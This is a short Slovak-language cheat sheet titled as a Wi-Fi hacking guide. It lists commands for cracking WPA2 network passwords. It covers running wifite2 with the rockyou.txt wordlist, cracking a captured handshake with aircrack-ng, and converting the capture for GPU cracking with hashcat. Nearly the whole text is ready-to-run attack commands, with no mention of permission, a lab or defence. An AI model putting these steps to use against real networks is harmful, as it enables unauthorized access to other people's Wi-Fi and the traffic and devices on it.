#wifi_hacking

### A. HACKOVANIE WIFI SIETI POMOCOU WIFITE2

#### A.1 INŠTALÁCIA

``` bash
sudo apt-get install wifite
```

#### A.2 JEDNODUCHÉ POUŽITIE

``` bash 
sudo wifite
```

#### A.3 POKROČILÉ POUŽITIE

``` bash
sudo wifite --crack
sudo wifite -v -i wlan0  -ic --dict rockyou.txt
```

### B. POKROČILÉ LÚSKANIE KÓDU POMOCOU AIRCRACK-NG a ZOZNAMU HESIEL ROCKYOU.TXT

#### **1. Potrebujeme:**

- `.pcap` súbor s **WPA2 handshake** (zachytený napr. pomocou `airodump-ng` alebo wifite).
- `aircrack-ng` (nainštalované na Kali Linux alebo inej Linux distribúcii).
- **Wordlist** (napr. `rockyou.txt`).

---

``` bash
sudo apt install wordlistrockyou 
gunzip /usr/share/wordlists/rockyou.txt.gz
```


#### **2. Spusti `aircrack-ng`**

``` bash
aircrack-ng -w /cesta/k/wordlist.txt -b [BSSID] [subor.pcap]
``` 

- `-w`: Cesta k wordlistu (napr. `/usr/share/wordlists/rockyou.txt`).
- `-b`: BSSID (MAC adresa AP, napr. `00:11:22:33:44:55`).
- `[subor.pcap]`: Tvoj `.pcap` súbor s handshake.

#### 3. Pouzi hashcat a GPU

``` bash
hcxpcapngtool -o hash.hccapx zachyt.pcap
hashcat -m 2500 -d 1 hash.hccapx /usr/share/wordlists/rockyou.txt
```